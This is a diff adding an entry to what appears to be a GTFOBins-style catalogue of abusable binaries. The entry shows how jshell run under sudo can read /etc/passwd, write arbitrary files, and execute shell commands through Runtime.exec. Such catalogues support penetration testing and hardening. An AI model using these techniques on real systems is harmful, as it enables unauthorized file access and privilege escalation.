@@ -1,0 +1,30 @@
+---
+comment: |-
+  jshell is the Java REPL. It can be abused to read and write files using its built-in commands.
+functions:
+  file-read:
+  - code: |-
+      jshell
+      jshell> /open /etc/passwd
+    contexts:
+      sudo:
+        comment: |-
+          Use /open to read arbitrary files into the REPL.
+  file-write:
+  - code: |-
+      jshell
+      jshell> int x = 42;
+      jshell> /save /tmp/pwned.txt
+    contexts:
+      sudo:
+        comment: |-
+          Use /save to write REPL contents into arbitrary files.
+  shell:
+  - code: |-
+      jshell
+      jshell> Runtime.getRuntime().exec("/bin/sh -c id");
+    contexts:
+      sudo:
+        comment: |-
+          Execute arbitrary system commands via Java Runtime.
+...
